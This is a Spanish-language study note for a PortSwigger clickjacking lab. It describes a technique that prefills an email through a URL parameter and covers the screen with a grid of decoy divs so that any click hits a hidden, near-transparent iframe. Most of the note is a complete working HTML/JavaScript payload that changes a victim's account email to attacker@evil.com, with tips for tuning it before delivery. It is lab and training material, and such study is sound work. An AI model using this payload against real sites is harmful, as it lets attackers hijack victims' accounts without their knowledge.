---
aliases:
  - Clickjacking - prefill email + grilla
tags:
  - vuln/clickjacking
  - example
  - portswigger
---

# Ejemplo — Prefill de email + grilla de señuelos

> Lab: [Clickjacking with form input data prefilled from a URL parameter](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input) · técnica → [[vulnerabilities/004-clickjacking/clickjacking|entry point]]

**Qué demuestra:**
- **Prellenar el email** por query param en el `src` del iframe (`?email=...`) → la víctima no tipea nada.
- **Grilla de señuelos** que **tapiza toda la pantalla** con `<div>` clickeables: en vez de alinear un único señuelo con precisión, cubrís todo → **cualquier** clic de la víctima cae en un señuelo (y el iframe casi transparente por encima recibe el clic sobre el botón real).
- `onload` estira el iframe a `screen.width/height`; `sandbox="allow-top-navigation allow-forms"` deja enviar el form.

> Reemplazá la URL del target y el email. Para entregar, bajá la `opacity` (acá `0.4` es para calibrar).

```html
<style>
iframe {
    position: absolute;
    opacity: 0.4;
    z-index: 2;
}
</style>

<body>
<script>
(function () {
  const width = 50;
  const height = 20;
  const cols = Math.ceil(window.innerWidth / width);
  const rows = Math.ceil(window.innerHeight / height);

  for (let y = 0; y < rows; y++) {
    for (let x = 0; x < cols; x++) {
      const el = document.createElement("div");
      el.textContent = "click";

      el.style.position = "absolute";
      el.style.left = (x * width) + "px";
      el.style.top = (y * height) + "px";
      el.style.width = width + "px";
      el.style.height = height + "px";

      el.style.display = "flex";
      el.style.alignItems = "center";
      el.style.justifyContent = "center";

      el.style.background = "rgba(0,0,0,0.1)";
      el.style.cursor = "pointer";
      el.style.zIndex = 1;

      document.body.appendChild(el);
    }
  }
})();
</script>
<iframe
src="https://TARGET.web-security-academy.net/my-account?email=attacker@evil.com"
onload="this.width=screen.width;this.height=screen.height;"
sandbox="allow-top-navigation allow-forms" id="target_website">
</iframe>
</body>
```
